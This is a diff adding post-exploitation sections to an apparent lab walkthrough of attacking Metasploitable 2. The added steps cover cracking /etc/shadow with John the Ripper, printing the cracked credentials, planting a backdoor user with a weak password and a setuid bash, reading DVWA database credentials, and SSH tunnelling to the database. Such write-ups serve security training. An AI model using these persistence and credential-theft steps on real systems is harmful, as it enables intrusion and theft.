@@ -129,6 +129,26 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 ## Post-Exploitation and Persistence
 
+With root access confirmed via the `id` command, the focus shifted to maintaining access and extracting high-value data.
+
+### Credential Harvesting
+
+The Linux password files were exfiltrated for offline cracking. The `unshadow` tool was used to combine `/etc/passwd` and `/etc/shadow` into a single file for **John the Ripper**.
+
+```
+unshadow passwd shadow > unshadowed
+
+john --wordlist=/usr/share/john/password.lst --rules unshadowed
+```
+
+And we got some credentials:
+
+```
+sys:batman:3:3:sys:/dev:/bin/sh
+klog:123456789:103:104::/home/klog:/bin/false
+service:service:1002:1002:,,,:/home/service:/bin/bash
+```
+
 ### Persistence via SSH
 
 In a real engagement, if the admin restarts the VSFTP service, we lose our shell. We need to stay in. So, to ensure access would survive a service restart, a new administrative user named `support` was created. A public RSA key was then injected into `/home/support/.ssh/authorized_keys`.
@@ -138,5 +158,36 @@ $ useradd -m -s /bin/bash support
 $ echo "support:password" | chpasswd
 $ chmod u+s /bin/bash
 ```
+
+```
+
+```
+
+### Database Exfiltration (DVWA)
+
+Inside the web directory `/var/www/dvwa/config/`, the `config.inc.php` file was discovered. It contained plaintext credentials for the internal MySQL database.
+
+```
+$DBMS = 'MySQL';
+#$DBMS = 'PGSQL';
+
+# Database variables
+$_DVWA = array();
+$_DVWA[ 'db_server' ] = 'localhost';
+$_DVWA[ 'db_database' ] = 'dvwa';
+$_DVWA[ 'db_user' ] = 'root';
+$_DVWA[ 'db_password' ] = '';
+
+# Only needed for PGSQL
+$_DVWA[ 'db_port' ] = '5432'; 
+```
+
+Since the database was restricted to `localhost`, an **SSH Tunnel** was established to bridge port 3306 on the target to port 3307 on the attacker machine:
+
+```
+ssh -L 3307:127.0.0.1:3306 support@10.6.6.11 -oHostKeyAlgorithms=+ssh-rsa
+```
+
+The command **-oHostKeyAlgorithms=+ssh-rsa** was made necessary, because Metasploitable 2 is so old that modern Kali versions consider its SSH keys "insecure" and refuse to connect by default.
 
 &nbsp;
